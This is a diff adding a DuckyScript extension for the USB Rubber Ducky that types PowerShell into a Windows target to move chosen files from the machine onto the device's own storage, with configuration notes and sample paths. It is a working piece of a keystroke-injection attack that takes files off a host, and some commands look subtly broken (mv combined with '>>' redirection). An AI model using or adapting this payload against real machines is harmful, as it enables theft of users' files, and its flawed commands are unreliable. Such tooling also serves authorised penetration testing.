@@ -1,0 +1,68 @@
+EXTENSION SAVE_FILES_IN_RUBBER_DUCKY_STORAGE_WINDOWS
+    REM VERSION 1.0
+    REM AUTHOR: Aleff
+    REM_BLOCK Documentation
+        This extension is used to save one or more files through the USB Rubber Ducky storage.
+
+        TARGET:
+            Windows 10/11
+
+        USAGE:
+            Insert this extension when you have one or more files that you want to save in your USB Rubber Ducky.
+
+        CONFIGURATION:
+            Set #DRIVER_LABEL variable with the correct Label of your USB Rubber Ducky considering that the default value is 'DUCK'.
+
+            Set #FLAG_SINGLE_FILE with TRUE if you want to save just one file.
+            In this case you will need to specify the file path within the #SINGLE_PATH variable OR, in case the exact path to the file you can only acquire it at runtime and so via the powershell, use in the powershell the $fileToSavePath variable to capture this path.
+                i.e. in DuckyScript EXTENSION
+                    DEFINE #SINGLE_PATH C:\Users\Aleff\Downloads\photo.png
+                i.e. in PowerShell before extension
+                    $fileToSavePath = "C:\Users\Aleff\Downloads\photo.png"
+
+            Set #FLAG_SINGLE_FILE FALSE if you want to send multiple files.
+            In this case in the PowerShell you will have to create the variable $fileToSavePaths, which is an array of strings that should contain the list of paths related to the files you want to save.
+                i.e. in PowerShell before extension:
+                    $fileToSavePaths = @(
+                        "C:\Users\Aleff\Downloads\photo.png",
+                        "C:\Users\Aleff\Downloads\document.pdf",
+                        "C:\Users\Aleff\Downloads\song.mp3"
+                    )
+                Some tips:
+                    How to create an Array?
+                        > $fileToSavePaths = @()
+                    How to add an element?
+                        > $fileToSavePaths += "C:\Users\Aleff\Downloads\photo.png"
+                    How to see the array?
+                        > $fileToSavePaths
+    END_REM
+    REM Settings
+    DEFINE #DRIVER_LABEL DUCK
+    DEFINE #FLAG_SINGLE_FILE FALSE
+    DEFINE #SINGLE_PATH 0
+
+    REM Extension Code
+    FUNCTION SAVE_SINGLE_FILE()
+        IF ( #SINGLE_PATH != 0 ) THEN
+            STRINGLN mv #SINGLE_PATH >> ${m}:\
+        ELSE IF ( #SINGLE_PATH == 0 ) THEN
+            STRINGLN mv ${fileToSavePath} >> ${m}:\
+        END_IF
+    END_FUNCTION
+
+    FUNCTION SAVE_MULTIPLE_FILES()
+        STRINGLN
+            foreach ($fileToSavePath in $fileToSavePaths) {
+                mv ${fileToSavePath} >> ${m}:\
+            }
+        END_STRINGLN
+    END_FUNCTION
+
+    STRINGLN $m=(Get-Volume -FileSystemLabel '#DRIVER_LABEL').DriveLetter;
+    IF_DEFINED_TRUE #FLAG_SINGLE_FILE
+        SAVE_SINGLE_FILE()
+    END_IF_DEFINED
+    IF_NOT_DEFINED_TRUE #FLAG_SINGLE_FILE
+        SAVE_MULTIPLE_FILES()
+    END_IF_DEFINED
+END_EXTENSION
